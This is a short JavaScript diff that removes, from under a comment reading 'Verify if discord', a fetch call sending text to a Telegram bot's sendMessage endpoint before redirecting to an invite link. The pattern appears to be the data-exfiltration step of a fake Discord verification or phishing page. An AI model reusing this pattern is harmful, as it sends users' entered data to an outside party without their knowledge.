@@ -69,11 +69,6 @@
 
 
                     //Verify if discord
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${text}`).then(response => response.json()).then(json => { 
-                        alert(text)
-                        window.location.href = invite_link;
-                    });
-
 
                     
                 }
